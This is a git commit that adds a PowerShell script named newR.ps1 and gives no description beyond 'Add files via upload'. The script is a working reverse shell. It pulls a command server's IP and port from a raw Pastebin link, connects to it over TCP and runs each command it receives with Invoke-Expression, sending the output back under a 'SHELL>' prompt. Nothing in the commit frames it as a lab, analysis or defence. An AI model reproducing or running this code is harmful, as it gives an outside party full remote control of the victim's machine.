5317a00da4118061c30312aed47604dfe861be80
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-03-01 20:22:03 +0700

    Add files via upload

---
+++ newR.ps1
@@ -0,0 +1,27 @@
+$pastebinLink = 'https://pastebin.com/raw/b9j9rc8N'
+$pastebinContent = Invoke-RestMethod -Uri $pastebinLink
+$ip, $port = $pastebinContent -split ':'
+
+$TCPClient = New-Object Net.Sockets.TCPClient($ip, $port)
+$NetworkStream = $TCPClient.GetStream()
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+
+function WriteToStream ($String) {
+    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | ForEach-Object {0}
+    $StreamWriter.Write($String + 'SHELL> ')
+    $StreamWriter.Flush()
+}
+
+WriteToStream ''
+
+while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
+    $Output = try {
+        Invoke-Expression $Command 2>&1 | Out-String
+    } catch {
+        $_ | Out-String
+    }
+    WriteToStream ($Output)
+}
+
+$StreamWriter.Close()
